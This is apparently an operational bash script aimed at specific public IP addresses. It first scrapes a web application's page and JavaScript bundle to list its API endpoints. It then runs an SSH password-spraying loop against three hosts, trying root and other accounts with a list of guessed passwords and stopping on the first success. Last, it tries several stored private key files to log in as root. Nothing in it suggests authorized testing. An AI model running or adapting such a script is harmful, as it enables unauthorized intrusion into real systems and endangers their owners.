#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
echo "### SPA-JS"
timeout 12 curl -s -m 10 http://123.184.7.135:18080/ -o /tmp/index.html
grep -oE '(src|href)="[^"]+\.(js|css)"' /tmp/index.html | head -10
JS=$(grep -oE 'src="[^"]+\.js"' /tmp/index.html | head -1 | sed 's/src="//;s/"//')
echo "JS=$JS"
if [ -n "$JS" ]; then
  case "$JS" in http*) U="$JS";; /*) U="http://123.184.7.135:18080$JS";; *) U="http://123.184.7.135:18080/$JS";; esac
  echo "-- $U"; timeout 20 curl -s -m 18 "$U" -o /tmp/app.js -w "code=%{http_code} len=%{size_download}\n"
  grep -oE '"/api/[a-zA-Z0-9_/{}$.-]*"' /tmp/app.js | sort -u | head -60
fi
echo "### SSH-LADDER"
for h in 123.184.7.135 123.184.7.129 123.184.7.130; do
  for u in root ubuntu kgzs; do
    for p in 'Beijingcs.2024' 'Kgzs@2024' 'Admin@123_para#!2024' 'ubuntu@' 'Bingxing.2026'; do
      R=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password,keyboard-interactive -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 $u@$h 'echo HIT;id -un;hostname;ip -br a|head -4' 2>&1 | tr '\n' ' ' | cut -c1-220)
      echo "SSH $h $u|$p => $R"
      case "$R" in *HIT*) echo "SUCCESS $h $u $p"; break 3;; esac
      sleep 1
    done
  done
done
echo "### KEYTRY-135"
for k in keys2/k04_ibm_key.pem_ keys2/k110_k04_ibm_key.pem_ keys/k04_ibm_key.pem_ keys/k03_gpu_key.pem_; do
  [ -f "$k" ] || continue
  chmod 600 "$k" 2>/dev/null
  R=$(timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes root@123.184.7.135 'echo OK;hostname' 2>&1 | tr '\n' ' ' | cut -c1-120)
  echo "KEY $k => $R"
done
echo "### END $(date -u +%FT%TZ)"
